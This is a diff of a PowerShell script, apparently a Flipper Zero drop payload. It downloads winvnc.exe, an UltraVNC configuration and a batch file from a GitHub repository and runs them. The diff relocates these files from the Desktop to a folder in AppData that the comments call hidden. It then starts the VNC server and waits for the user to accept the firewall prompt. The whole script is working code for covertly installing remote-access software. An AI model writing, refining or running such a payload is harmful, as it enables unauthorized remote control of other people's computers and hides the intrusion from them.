@@ -1,11 +1,14 @@
 # Wait for 2 seconds
 Start-Sleep -Seconds 2
 
-# Get the Desktop path using environment variables
-$desktopPath = [System.IO.Path]::Combine([System.Environment]::GetFolderPath([System.Environment+SpecialFolder]::Desktop), 'inentor')
+# Get the path to a hidden folder in AppData
+$hiddenFolderPath = [System.IO.Path]::Combine($env:APPDATA, 'inentor')
 
-# Create the folder
-New-Item -ItemType Directory -Path $desktopPath -Force
+# Create the folder if it doesn't exist
+if (!(Test-Path -Path $hiddenFolderPath)) {
+    New-Item -ItemType Directory -Path $hiddenFolderPath -Force
+}
+
 # Wait for 2 seconds
 Start-Sleep -Seconds 2
 
@@ -15,9 +18,9 @@ $url2 = "https://raw.githubusercontent.com/TriPaGonski/VNCFLIPPERZERO/main/ultra
 $url3 = "https://raw.githubusercontent.com/TriPaGonski/VNCFLIPPERZERO/main/Main.bat"
 
 # Define the local file paths
-$filePath1 = "$desktopPath\winvnc.exe"
-$filePath2 = "$desktopPath\ultravnc.ini"
-$filePath3 = "$desktopPath\main.bat"
+$filePath1 = "$hiddenFolderPath\winvnc.exe"
+$filePath2 = "$hiddenFolderPath\ultravnc.ini"
+$filePath3 = "$hiddenFolderPath\main.bat"
 
 # Download the files
 Invoke-WebRequest -Uri $url1 -OutFile $filePath1
@@ -31,13 +34,16 @@ Invoke-WebRequest -Uri $url3 -OutFile $filePath3
 Start-Sleep -Seconds 2
 
 # List the directory contents to verify files are downloaded
-Get-ChildItem -Path $desktopPath
+Get-ChildItem -Path $hiddenFolderPath
 
 # Start winvnc.exe to trigger firewall prompt
-Start-Process -FilePath $filePath1 -ArgumentList "-run" -WorkingDirectory $desktopPath
+Start-Process -FilePath $filePath1 -ArgumentList "-run" -WorkingDirectory $hiddenFolderPath
 
 # Wait for user to accept firewall prompt
 Start-Sleep -Seconds 10
 
 # Execute the main.bat file
-Start-Process -FilePath $filePath3 -WorkingDirectory $desktopPath -NoNewWindow
+Start-Process -FilePath $filePath3 -WorkingDirectory $hiddenFolderPath -NoNewWindow
+
+# Open the file location in File Explorer
+Start-Process explorer.exe -ArgumentList "/select,$filePath3"
